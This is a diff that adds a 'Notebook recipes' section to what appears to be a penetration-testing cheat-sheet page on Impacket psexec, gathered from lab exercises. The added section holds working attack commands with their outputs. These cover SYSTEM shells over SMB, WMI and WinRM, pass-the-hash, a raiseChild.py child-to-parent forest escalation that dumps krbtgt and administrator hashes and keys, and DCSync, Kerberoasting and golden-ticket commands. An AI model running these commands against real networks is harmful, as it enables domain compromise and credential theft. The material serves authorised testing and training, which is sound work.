@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=psexec) · [All tools](/index)
+
 **Requires:** Valid administrator credentials, SMB access, and writable admin shares/service creation rights on the Windows host.
 
 ## Password (prompted)
@@ -31,8 +33,456 @@ impacket-psexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=psexec)
+## Notebook recipes
 
-## Learning and original examples
+21 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [psexec.py - SMB remote shell](/tools/psexec)
+<AccordionGroup>
+
+<Accordion title="Remote Access">
+
+### Remote Access
+
+**Active Directory Enumeration Commands**
+
+```bash
+evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
+    # Connect to Windows through WinRM
+psexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Attempt remote command execution through SMB
+
+wmiexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Execute commands remotely through WMI
+```
+
+</Accordion>
+
+<Accordion title="4. Impacket Toolkit">
+
+### 4. Impacket Toolkit
+
+**Active Directory Enumeration from Linux**
+
+```bash
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+```
+
+</Accordion>
+
+<Accordion title="Getting a SYSTEM shell using Impacket&#x27;s psexec.py">
+
+### Getting a SYSTEM shell using Impacket's psexec.py
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.5.5.....
+[*] Found writable share ADMIN$
+[*] Uploading file nkYjGWDZ.exe
+[*] Opening SVCManager on 172.16.5.5.....
+[*] Creating service eTCU on 172.16.5.5.....
+[*] Starting service eTCU.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+ACADEMY-EA-DC01
+```
+
+</Accordion>
+
+<Accordion title="Performing the Attack with raiseChild.py">
+
+### Performing the Attack with raiseChild.py
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
+[*] Forest FQDN is: INLANEFREIGHT.LOCAL
+[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
+[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
+[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+[*] Getting credentials for INLANEFREIGHT.LOCAL
+INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
+[*] Target User account name is administrator
+INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Found writable share ADMIN$
+[*] Uploading file BnEGssCE.exe
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Starting service UVNb.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>exit
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Stopping service UVNb.....
+[*] Removing service UVNb.....
+[*] Removing file BnEGssCE.exe.....
+```
+
+**Child to Parent Trusts - Linux**
+
+```python
+#   The workflow is as follows:
+#       Input:
+#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
+#              The domain specified MUST be the domain FQDN.
+#           2) Optionally a pathname to save the generated golden ticket (-w switch)
+#           3) Optionally a target-user RID to get credentials (-targetRID switch)
+#              Administrator by default.
+#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
+#              Enterprise Admin by default.
+#
+#       Process:
+#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
+#           2) Find out what the forest FQDN is (via [MS-NRPC])
+#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
+#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
+#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
+#              and setting expiration 10 years from now
+#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
+#           7) If file was specified, save the golden ticket in ccache format
+#           8) If target was specified, a PSEXEC shell is launched
+#
+#       Output:
+#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
+#           2) A golden ticket saved in ccache for future fun and profit
+#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
+#              parameter.
+```
+
+</Accordion>
+
+<Accordion title="Impacket PsExec">
+
+### Impacket PsExec
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ impacket-psexec -h
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
+                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
+                 target [command ...]
+
+PSEXEC like functionality example using RemComSvc.
+
+positional arguments:
+  target                [[domain/]username[:password]@]<targetName or address>
+  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c pathname           copy the filename for later execution, arguments are passed in the command option
+  -path PATH            path of the command to execute
+  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
+  -ts                   adds timestamp to every logging output
+  -debug                Turn DEBUG output ON
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+  -no-pass              don't ask for password (useful for -k)
+  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
+                        ones specified in the command line
+  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
+  -keytab KEYTAB        Read keys for SPN from keytab file
+
+connection:
+  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
+  -target-ip ip address
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.110.17.....
+[*] Found writable share ADMIN$
+[*] Uploading file EHtJXgng.exe
+[*] Opening SVCManager on 10.10.110.17.....
+[*] Creating service nbAc on 10.10.110.17.....
+[*] Starting service nbAc.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19041.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami && hostname
+
+nt authority\system
+WIN7BOX
+```
+
+</Accordion>
+
+<Accordion title="Check installation on Kali">
+
+### Check installation on Kali
+
+**Impacket: Script Quick Reference**
+
+```bash
+command -v impacket-psexec
+impacket-psexec -h
+# If missing:
+sudo apt install impacket-scripts
+```
+
+</Accordion>
+
+<Accordion title="Original captured examples">
+
+### Original captured examples
+
+**Impacket: Script Quick Reference**
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+</Accordion>
+
+<Accordion title="impacket (psexec / wmiexec / smbexec / atexec)">
+
+### impacket (psexec / wmiexec / smbexec / atexec)
+
+**Pass the Hash from Linux and Windows**
+
+```bash
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+</Accordion>
+
+<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">
+
+### Mental Model — "What Do I Use When?"
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+"I found an open port"
+├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
+├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
+├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
+├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
+├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
+├── Is it monitoring?      → SNMP (161), IPMI (623)
+└── Not sure?              → nmap -sV -sC <IP> -p <port>
+
+"I need to get files off the target"
+├── Linux → scp/sftp (22)
+├── Windows → SMB (445) or evil-winrm download
+├── Web → wget/curl
+└── Simple → python3 -m http.server (on target)
+
+"I need to get files onto the target"
+├── Linux → scp/sftp (22) or wget from attacker
+├── Windows → SMB, certutil, PowerShell wget
+├── Web upload → if upload form exists
+└── Simple → python3 -m http.server (on attacker)
+
+"I need a shell"
+├── Linux → SSH (22)
+├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
+└── Either → reverse shell via exploit
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision">
+
+### Quick Decision
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+Linux shell    → SSH (22)
+Windows shell  → Evil-WinRM (5985) or PsExec (445)
+Windows GUI    → RDP (3389)
+Windows cmd    → WMI (135)
+```
+
+</Accordion>
+
+<Accordion title="From SMB access to remote code execution">
+
+### From SMB access to remote code execution
+
+**SMB Enumeration and Shares**
+
+```bash
+impacket-psexec <user>:'<pass>'@<IP>             # SYSTEM shell (noisiest; drops a service binary)
+impacket-smbexec <user>:'<pass>'@<IP>            # semi-interactive, no binary dropped (quieter)
+impacket-wmiexec <user>:'<pass>'@<IP>            # over WMI, fileless (stealthiest)
+impacket-psexec -hashes :<NTLM_hash> <user>@<IP> # Pass-the-Hash variant
+```
+
+</Accordion>
+
+<Accordion title="Module Naming Convention">
+
+### Module Naming Convention
+
+**Shells, Payloads, and Interactive TTYs**
+
+```text
+exploit/windows/smb/psexec
+  │        │      │    └── Method
+  │        │      └── Service
+  │        └── Platform
+  └── Module type
+```
+
+</Accordion>
+
+<Accordion title="Meterpreter getsystem and alternatives">
+
+### Meterpreter getsystem and alternatives
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+meterpreter> getsystem 
+Tokenvator.exe getsystem cmd.exe 
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
+psexec -s -i cmd.exe 
+python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
+```
+
+</Accordion>
+
+<Accordion title="Find or install the command">
+
+### Find or install the command
+
+**psexec.py - SMB remote shell**
+
+```bash
+command -v impacket-psexec
+command -v psexec.py
+impacket-psexec -h
+
+# Kali package, if the command is missing
+sudo apt install impacket-scripts
+```
+
+**psexec.py - SMB remote shell**
+
+Context from the notebook: impacket-psexec  is Kali's launcher for Impacket's  psexec.py . Microsoft's  PsExec.exe  is a separate Windows tool; its flags are different.
+
+```text
+PsExec.exe
+```
+
+</Accordion>
+
+<Accordion title="Password, hash, or Kerberos">
+
+### Password, hash, or Kerberos
+
+**psexec.py - SMB remote shell**
+
+```bash
+# Local account: use the target's actual computer name as the domain
+impacket-psexec 'HOSTNAME/administrator@192.0.2.10'
+
+# NT hash: replace NT_HASH, keep the leading colon for an empty LM hash
+impacket-psexec -hashes ':NT_HASH' 'example.local/administrator@192.0.2.10'
+
+# Existing ticket cache: target the correct hostname/SPN, connect to its IP
+export KRB5CCNAME=/path/to/user.ccache
+impacket-psexec -k -no-pass -target-ip 192.0.2.10 'example.local/user@server.example.local'
+```
+
+</Accordion>
+
+<Accordion title="psexec.py - SMB remote shell">
+
+### psexec.py - SMB remote shell
+
+**psexec.py - SMB remote shell**
+
+```bash
+# Domain account; prompts for its password
+impacket-psexec 'example.local/administrator@192.0.2.10'
+
+# Same script name used by many HTB lessons
+psexec.py 'example.local/administrator@192.0.2.10'
+```
+
+</Accordion>
+
+<Accordion title="Impacket: Script Quick Reference">
+
+### Impacket: Script Quick Reference
+
+**Impacket: Script Quick Reference**
+
+Context from the notebook: SMB remote shell psexec.py  /  impacket-psexec PsExec quickstart
+
+```text
+psexec.py
+```
+
+</Accordion>
+
+<Accordion title="Windows Remote Access">
+
+### Windows Remote Access
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: PsExec 445 Remote exec via SMB psexec.py &lt;user>:&lt;pass>@&lt;IP>
+
+```text
+psexec.py <user>:<pass>@<IP>
+```
+
+</Accordion>
+
+</AccordionGroup>
